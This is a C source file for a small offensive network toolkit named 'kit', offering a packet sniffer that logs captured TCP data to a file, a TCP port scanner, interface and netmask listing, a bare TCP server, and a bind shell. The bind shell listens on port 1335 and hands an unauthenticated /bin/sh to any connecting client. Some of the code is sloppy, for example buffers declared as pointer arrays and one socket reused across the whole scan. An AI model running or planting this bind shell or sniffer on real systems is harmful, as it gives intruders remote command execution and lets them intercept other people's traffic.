#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <net/if.h>
#include <pcap.h>
#include <unistd.h>
#include <ifaddrs.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define PORT_START 1 // You can change this if you want!
#define PORT_END 1204 // You can change this if you want!
#define PORT 1335 // For bind-shell and server!

// For the banner!
struct banner_info {
    char *username;
    char *hostname[128];
    char *path[128];
};


/*
kit
Date: 08/10/21
Author: 0x1CA3
*/


// Colors!
static void color_red(void) {
    printf("\e[0;31m");
}

static void color_green(void) {
    printf("\e[0;32m");
}

static void reset_color(void) {
    printf("\e[0;37m");
}

static void clear_screen(void) {
    puts("\033[H\033[2J");
}

// Banner!
static void kit_banner(void) {
    struct banner_info *pb, binfo;
    pb = &binfo;
    pb->username = (char *)malloc(32 * sizeof(char));
    
    cuserid(pb->username);
    getcwd(pb->path, sizeof(pb->path));
    gethostname(pb->hostname, sizeof(pb->hostname));

    printf("\n                                            Host Information");
    printf("\n		     __  __ __ __           ────────────────");
    printf("\n		     |  |/  |__|  |_        Hostname -> %s", pb->hostname);
    printf("\n		     |     <|  |   _|       Username -> %s", pb->username);
    printf("\n		     |__|\\__|__|____|       Path -> %s", pb->path);
    printf("\n");
    puts(""
    "\n	┌────────────────────────────────────────┐"
    "\n	│                Credits                 │"
    "\n	├────────────────────────────────────────┤"
    "\n	│ Made by: https://www.github.com/0x1CA3 │"
    "\n	└────────────────────────────────────────┘"
    "\n");
}

// Help menu!
static void main_help_menu(void) {
    puts(""
    "\n┌───────┬───────────────────────────────────────┬───────────────┐"
    "\n│ Flags │              Description              │ Usage Example │"
    "\n├───────┼───────────────────────────────────────┼───────────────┤"
    "\n│ -h    │ Displays the available flags          │ -h            │"
    "\n│ -i    │ Displays the available interfaces     │ -i            │"
    "\n│ -m    │ Displays the network mask             │ -m            │"
    "\n│ -s    │ Starts a packet sniffer               │ -s            │"
    "\n│ -b    │ Starts a bind-shell                   │ -b            │"
    "\n│ -t    │ Starts a TCP server                   │ -t 127.0.0.1  │"
    "\n│ -p    │ Does a port scan against the given IP │ -p 127.0.0.1  │"
    "\n└───────┴───────────────────────────────────────┴───────────────┘"
    "\n");
}

// Lists the available interfaces!
void list_interfaces(void) {
    int i = 0;
    char pcap_error[PCAP_ERRBUF_SIZE];
    char *intface = pcap_lookupdev(pcap_error);
    
    struct if_nameindex *iface;
    struct if_nameindex *number_of_interfaces;
    number_of_interfaces = if_nameindex();
    
    puts(""
        "\n[+] Interfaces [+]"
        "\n------------------");

    for (iface = number_of_interfaces; iface->if_index != 0 && iface->if_name != NULL; iface++) {
        i++;
        printf("%s\n", iface->if_name);
    }
    
    puts("\n[+] Default Interface [+]\n-------------------------");
    if (intface == NULL) {
        printf("[!] Could not find default interface! [!]");
    } else {
        printf("\n-> %s <-\n\n", (intface));
    }
    exit(EXIT_SUCCESS);
}

// Gives a status of the packets, and logs the data in a file!
void capture_packets(u_char *ex, const struct pcap_pkthdr* pk, const u_char* data) {
	clear_screen();
    int i = 0;
    static int packets = 0;
	
    char line[255];
    
    printf("        Packets -> %d Packet size -> %d\n", ++packets, pk->len);
	
    FILE *fp = fopen("log.txt", "w");
    if (fp == NULL) {
        printf("[!] Failed to create log file! [!]");
    } else {
        for (i = 0; i < pk->len; i++) {
            if (isprint(data[i])) {
                printf("%c ", data[i]);
            } else {
                printf(" . ");
                fprintf(fp, "%c", data[i]);
            }
            if ((i % 16 == 0 && i != 0) || i == pk->len-1) {
                printf("\n");
		    }
        }
	}
    fclose(fp);
}

// Starts the sniffer!
void sniffer(void) {
    int i;
	
    char *iface;
    const u_char *up;
	char pcap_error[PCAP_ERRBUF_SIZE];

    struct bpf_program fp;
    struct pcap_pkthdr hdr;
	
    pcap_t* pt;
    bpf_u_int32 bp;
    bpf_u_int32 bpp;

    iface = pcap_lookupdev(pcap_error);
    pt = pcap_open_live(iface, BUFSIZ, 1, -1, pcap_error);
    
    pcap_lookupnet(iface, &bpp, &bp, pcap_error);
    pcap_compile(pt, &fp, "tcp", 0, bpp);

	pcap_setfilter(pt, &fp);
	pcap_loop(pt, -1, capture_packets, NULL);
}

// Checks for errors!
int server_check(int fd, struct sockaddr_in server) {
    if (bind(fd, (struct sockaddr *)&server, sizeof(server)) != 0) {
        fprintf(stderr, "[!] Bind error! [!]\n");
        exit(EXIT_FAILURE);
    }
    
    if (listen(fd, 2) != 0) {
        fprintf(stderr, "[!] Listening error! [!]\n");
        exit(EXIT_FAILURE);
    }
}

// Starts the bind-shell!
int bind_shell(void) {
    int fd, connection;
    struct sockaddr_in server;

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = htonl(INADDR_ANY);
    server.sin_port = htons(PORT);

    fd = socket(PF_INET, SOCK_STREAM, 0);
    server_check(fd, server);
    connection = accept(fd, NULL, NULL);

    for (int i = 0; i < 3; i++) {
        dup2(connection, i);
    }

    execve("/bin/sh", NULL, NULL);    
    close(fd);
}

// Port-scanner!
void scanner(char **argv) {
    int fd, connection;
    struct sockaddr_in s;
    
    s.sin_family = AF_INET;
    s.sin_addr.s_addr = inet_addr(argv[2]);
    fd = socket(AF_INET, SOCK_STREAM, 0);
    
    puts(""
    "\n[+] Open Ports [+]"
    "\n------------------");

    for (int i = PORT_START; i <= PORT_END; i++) {
        s.sin_port = htons(i);
        connection = connect(fd, (struct sockaddr *)&s, sizeof(s));
        if (connection < 0) {
            printf("");
        } else {
            printf("Port -> %d\n", i);
        }
    }
    puts("");
}

// Retrieves the network mask!
void get_network_mask(void) {
    char *ip;
    
    struct sockaddr_in *net;
    struct ifaddrs *pip, *ipa;

    getifaddrs(&pip);
    for (ipa = pip; ipa; ipa = ipa->ifa_next) {
        if (ipa->ifa_addr->sa_family == AF_INET) {
            net = (struct sockaddr_in *) ipa->ifa_netmask;
            ip = inet_ntoa(net->sin_addr);

            puts(""
            "\n[+] Network mask [+]"
            "\n------------------");
            
            printf("Address -> %s\n\n", ip);
            break;
        }
    }
}

// Starts a regular TCP server!
int server(char **argv) {
    int fd, connection;

    struct sockaddr_in server;
    
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(argv[2]);
    server.sin_port = htons(PORT);

    fd = socket(AF_INET, SOCK_STREAM, 0);
    
    bind(fd, (struct sockaddr *)&server, sizeof(server));
    listen(fd, 128);

    connection = accept(fd, NULL, NULL);
    printf("\n[+] Connection Recieved! [+]\n");
    close(fd);
}

// Main function!
int main(int argc, char **argv) {
    color_red();
    kit_banner();
    reset_color();

    char args;
    for (args = 0; args < argc; args++) {
        char const *user = argv[args];
        if (user[0] == '-') {
            switch(user[1]) {
                case 'h':
                    color_green();
                    main_help_menu();
                    reset_color();
                    break;
                case 'i':
                    color_green();
                    list_interfaces();
                    reset_color();
                    break;
                case 'm':
                    color_green();
                    get_network_mask();
                    reset_color();
                    break;
                case 's':
                    color_green();
                    sniffer();
                    reset_color();
                    break;
                case 'p':
                    color_green();
                    scanner(argv);
                    reset_color();
                    break;
                case 'b':
                    color_green();
                    bind_shell();
                    reset_color();
                    break;
                case 't':
                    color_green();
                    server(argv);
                    reset_color();
                    break;
                default:
                    break;
            }
        }
    }
    EXIT_SUCCESS;
}
